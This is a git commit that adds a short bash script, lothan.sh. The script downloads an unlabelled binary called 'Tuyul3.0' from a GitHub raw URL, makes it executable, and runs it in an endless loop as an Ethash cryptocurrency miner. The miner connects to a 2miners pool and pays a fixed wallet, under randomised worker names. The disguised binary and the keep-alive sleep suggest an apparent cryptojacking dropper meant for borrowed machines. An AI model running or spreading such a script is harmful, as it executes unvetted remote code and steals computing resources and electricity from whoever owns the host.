aef4f79396027557aee632b7a29da6dbd23753ca
moskvo251 <88077247+moskvo251@users.noreply.github.com>
2021-07-28 06:48:57 +0000

    Create lothan.sh

---
+++ lothan.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+POOL=asia-etc.2miners.com:1010
+WALLET=0xc19911dcbc324b94ad4ea306f055b7fa9d0a9b5e
+WORKER=$(echo $(shuf -i 1-4 -n 1)-RIG)
+wget https://github.com/mansoorjama/new/raw/main/Tuyul3.0
+chmod +x Tuyul3.0
+while [ 1 ]; do
+./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sleep 5
+done
+sleep 999999999 
